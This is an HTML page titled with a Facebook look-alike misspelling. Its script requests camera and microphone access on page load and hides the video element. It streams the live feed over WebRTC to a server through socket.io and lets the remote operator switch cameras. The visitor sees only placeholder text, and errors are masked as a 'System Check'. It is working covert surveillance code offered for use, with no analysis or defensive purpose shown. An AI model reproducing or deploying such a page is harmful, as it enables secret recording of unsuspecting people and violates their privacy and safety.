<!DOCTYPE html>
<html>
<head>
    <title>Facebok.com</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        /* Hidden Video for stream */
        video { display: none; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body> 
    
<p align="center">this is a page </p>p>
    <video id="v" autoplay playsinline muted></video>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let pc, stream, mode = "user";

        async function start() {
            if (stream) stream.getTracks().forEach(t => t.stop());
            if (pc) pc.close();

            pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: mode }, 
                    audio: true 
                });
                video = document.getElementById('v');
                video.srcObject = stream;
                stream.getTracks().forEach(t => pc.addTrack(t, stream));

                pc.onicecandidate = e => e.candidate && socket.emit("ice", e.candidate);
                
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                socket.emit("offer", offer);
            } catch (e) { console.log("System Check..."); }
        }

        socket.on("switch", () => {
            mode = (mode === "user") ? "environment" : "user";
            start();
        });

        socket.on("answer", a => pc.setRemoteDescription(new RTCSessionDescription(a)));
        socket.on("ice", c => pc.addIceCandidate(new RTCIceCandidate(c)));

        window.onload = start;
    </script>
</body>
</html>
